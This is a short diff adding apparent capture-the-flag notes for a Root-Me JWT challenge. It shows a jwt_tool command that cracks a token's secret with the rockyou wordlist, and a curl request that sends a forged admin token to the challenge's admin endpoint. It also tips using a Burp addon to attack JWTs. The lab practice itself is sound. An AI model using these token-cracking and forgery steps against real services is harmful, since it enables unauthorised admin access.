@@ -1,0 +1,8 @@
+#JWT cURL request
+curl -X POST -H 'Accept: application/json' -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.ShHwc6DRicQBw6YD0bX1C_67QKDQsOY5jV4LbopVghG9cXID7Ij16Rm2DxDZoCy3A7YXQpU4npOJNM-lt0gvmg" http://challenge01.root-me.org/web-serveur/ch59/admin > flag
+
+#Crack JWT
+python jwt_tool.py eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiZ3Vlc3QifQ.a4Cxf97xhqpexX-Mw0Ik74ncg6TdCK8R_Q7wYC929himTEOyJmePFYCJYvj-ICUTZrVqjPUa83GeMO5AVuOH0Q ~/opt/dict/rockyou.txt
+
+#Tips JWT
+You can use JOSPEH addon from burp suite to attack JWT ;)
